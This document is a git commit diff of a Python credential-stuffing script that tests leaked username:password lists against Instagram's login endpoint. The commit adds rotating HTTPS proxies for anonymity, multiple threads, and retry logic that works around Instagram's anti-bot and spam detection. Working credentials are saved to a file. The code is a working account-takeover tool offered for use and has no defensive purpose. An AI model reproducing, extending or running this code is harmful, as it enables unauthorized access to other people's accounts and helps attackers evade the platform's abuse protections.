723a479234752b3f44e815d4af0471cefb13a583
peel1 <61979706+peel1@users.noreply.github.com>
2020-08-08 00:42:32 +0100

    Add files via upload
    -- Added Multi-Threading 
    -- Added Proxy support (HTTPS)
    -- Added Enhanced Anonymity 
    -- Added Alerts to User

--- Checker.py
+++ Checker.py
@@ -1,17 +1,38 @@
-from typing import Any, Union
-
+import threading
 import requests
-def Redline(Run):
+from itertools import islice
+import random
 
-    listname = input("name of user:pass list (must be in same directory as script) for example: usernameandpassword.txt")
+runner = int(0)
+x = int(0)
+
+
+def Redline(Run, listname, x, proxylist):
     passlist = open(listname, "r", encoding="utf8")
-    x = int(0)
     while Run == True:
-        ltemp = passlist.readline()
+        for line in islice(passlist, x, None):
+            ltemp = passlist.readline()
+            passlist.close()
+            break
         x = x + 1
         email = ltemp.partition(":")[0]
         passw = ltemp.partition(":")[2]
         passw = passw.rstrip()
+        s = open(proxylist, "r")
+        m = s.readlines()
+        l = []
+        for i in range(0, len(m) - 1):
+            g = m[i]
+            z = len(g)
+            a = g[:z - 1]
+            l.append(a)
+        l.append(m[i + 1])
+        o = random.choice(l)
+        proxzy = "https://" + o
+        proxz = {
+            'https': proxzy,
+        }
+        s.close()
         if email == "" and passw == "":
             print("End of File Reached. Exiting Program...")
             Run = False
@@ -20,12 +41,12 @@ def Redline(Run):
         headers = {
             'authority': 'www.instagram.com',
             'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
-            'x-instagram-ajax': '81a581bb9399',
+            'x-instagram-ajax': '82a581bb9399',
             'content-type': 'application/x-www-form-urlencoded',
             'accept': '*/*',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
+            'user-agent': '',
             'x-requested-with': 'XMLHttpRequest',
-            'x-csrftoken': 'rn3aR7phKTodUHWdDfCGlERA7Gmhes8X',
+            'x-csrftoken': 'rn3aR7phKDodUHWdDfCGlERA7Gmhes8X',
             'x-ig-app-id': '936619743392459',
             'origin': 'https://www.instagram.com',
             'sec-fetch-site': 'same-origin',
@@ -36,29 +57,37 @@ def Redline(Run):
             'cookie': ''
         }
 
-        response = requests.request("POST", url, headers=headers, data=payload)
-
+        response = requests.request("POST", url, headers=headers, data=payload, proxies=proxz)
         response = response.text.encode('utf8')
-
         responseshrt = str(response[0:17])
-        Fixed = str(b'{"user": true, "u')
-        if responseshrt == Fixed:
-            accounts = open("Accounts.txt", "w")
-            accounts.write("{}:{}".format(email, passw))
-            print("Line {} contains a valid credentials and has been written to Accounts.txt".format(x))
-            accounts.close()
-        else:
-            print("Line {} doesn't contain valid credentials ".format(x))
+        return email, passw, responseshrt, x, Run, proxzy
 
 
-
-
-
-
-
-
-
-
+def PostRequest(email, passw, responseshrt, x, prozxy):
+    PostRequest.z = False
+    Fixed = str(b'{"user": true, "u')
+    FixedRetry = str(b'{"message": "chec')
+    FixedError = str(b'{"message": "feed')
+    FixedError2 = str(b'{"message": "Plea')
+    Errorshrt = str(b'{"errors": {"erro')
+    print(responseshrt)
+    if responseshrt == Fixed:
+        accounts = open("Accounts.txt", "w")
+        accounts.write("{}:{}".format(email, passw))
+        print("Line {} contains a valid credentials and has been written to Accounts.txt".format(x))
+        accounts.close()
+    elif responseshrt == FixedRetry:
+        print("Line {} has encounter a error (Instagram anti-bot) trying current line...".format(x))
+        PostRequest.z = True
+    elif responseshrt == FixedError or responseshrt == FixedError2:
+        print("Instagram Spam detection triggered on line {} retrying and printing proxy used".format(x))
+        print(prozxy)
+        PostRequest.z = True
+    elif responseshrt == Errorshrt:
+        print("Proxy Error Retrying line {}".format(x))
+        PostRequest.z = True
+    else:
+        print("Line {} doesn't contain valid credentials ".format(x))
 
 
 
@@ -78,7 +107,39 @@ print("""
                                                                           
                                                                                                                                                                                                   
 """)
-Redline(True)
+
+listname = input("name of user:pass list (must be in same directory as script) with .txt. For example DB.txt >")
+proxylist = input("name of proxy list IP:PORT (must be in same directory as script) with .txt. For example Proxylist.txt >")
+
+def Shredding(runner):
+    global x
+    if runner == 0:
+        x = int(0)
+    Run = True
+    email, passw, responseshrt, x, Run, proxzy = Redline(Run, listname, x, proxylist)
+    runner = runner + 1
+    return email, passw, responseshrt, x, Run, runner, proxzy
 
 
+Shreader1 = threading.Thread(target=Shredding, args=(runner,))
+Shreader2 = threading.Thread(target=Shredding, args=(runner,))
+Shreader3 = threading.Thread(target=Shredding, args=(runner,))
+Shreader4 = threading.Thread(target=Shredding, args=(runner,))
 
+y = int(0)
+while True == True:
+    if y == 0:
+        Shreader1.start()
+        Shreader2.start()
+        Shreader3.start()
+        Shreader4.start()
+        y = y + 1
+    Shreader1.join()
+    Shreader2.join()
+    Shreader3.join()
+    Shreader4.join()
+    email, passw, responseshrt, x, Run, Runner, proxzy = Shredding(runner)
+    PostRequest(email, passw, responseshrt, x, proxzy)
+    if PostRequest.z == True:
+        x = x - 1
+    runner = runner + 1
